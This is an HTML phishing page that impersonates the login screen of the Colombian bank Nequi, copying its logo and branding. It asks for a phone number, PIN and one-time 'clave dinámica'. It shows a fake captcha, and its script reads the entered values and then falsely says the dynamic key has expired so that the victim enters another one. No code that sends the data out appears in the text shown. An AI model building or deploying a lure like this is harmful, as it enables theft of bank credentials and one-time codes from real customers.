<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar a tu Nequi</title>
    <style>
        /* Estilos del código original */
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom right, #ffe5ec, #ffe5f1);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 380px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .subtitle {
            font-size: 14px;
            margin-bottom: 25px;
            color: #333;
        }
        form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .input-group {
            width: 100%;
            margin-bottom: 20px;
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            font-size: 14px;
            border: 1px solid #ddd;
            border-radius: 5px;
            outline: none;
            box-sizing: border-box;
        }
        .input-group input:focus {
            border-color: #D81B60;
        }
        .flag-input {
            display: flex;
            align-items: center;
            position: relative;
        }
        .flag {
            width: 24px;
            height: 16px;
            background: url('https://flagcdn.com/w40/co.png') no-repeat center;
            background-size: cover;
            margin-right: 10px;
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
        }
        .input-group input.with-flag {
            padding-left: 40px;
        }
        .captcha {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            font-size: 14px;
            color: #666;
        }
        .captcha input {
            margin-right: 8px;
        }
        .button {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            color: white;
            background-color: #D81B60;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #AD1457;
        }
        .info {
            font-size: 12px;
            color: #999;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://static.wixstatic.com/media/ae1ba9_a0fdfe2f514a4f068af2f276f32b162e~mv2.png/v1/crop/x_109,y_187,w_288,h_126/fill/w_288,h_126,al_c,q_85,enc_avif,quality_auto/Logo-Nequi-1-removebg-preview.png" alt="Logo Nequi" class="logo" width="150">
        <div class="subtitle">Podrás bloquear tu Nequi, consultar tus datos.</div>
        <form id="nequi-form">
            <div class="input-group">
                <div class="flag-input">
                    <span class="flag"></span>
                    <input 
                        type="text" 
                        id="phone" 
                        placeholder="Número de celular" 
                        maxlength="10" 
                        oninput="validateInput(this, /^[0-9]*$/)" 
                        class="with-flag">
                </div>
            </div>
            <div class="input-group">
                <input 
                    type="password" 
                    id="password" 
                    placeholder="Contraseña" 
                    maxlength="4" 
                    oninput="validateInput(this, /^[0-9]*$/)">
            </div>
            <div class="input-group">
                <input 
                    type="password" 
                    id="dynamic-key" 
                    placeholder="Clave dinámica" 
                    maxlength="6" 
                    oninput="validateInput(this, /^[0-9]*$/)">
            </div>
            <div class="captcha">
                <input type="checkbox" id="captcha"> No soy un robot
            </div>
            <button type="button" class="button" onclick="sendData()">Entrar</button>
        </form>
        <div class="info">Este sitio supera la cuota de reCAPTCHA.</div>
    </div>

    <script>
        function sendData() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const dynamicKey = document.getElementById('dynamic-key').value;
            const captchaChecked = document.getElementById('captcha').checked;

            if (!captchaChecked) {
                alert('Por favor, verifica que no eres un robot.');
                return;
            }

            if (phone && password && dynamicKey) {
                alert('⚠️ ¡Ups! Estás ingresando mal tu clave dinámica o expiró, verifica y vuelve a intentarlo.');
                location.reload(); // Recargar la página
            } else {
                alert('Por favor, completa todos los campos.');
            }
        }
    </script>
</body>
</html>
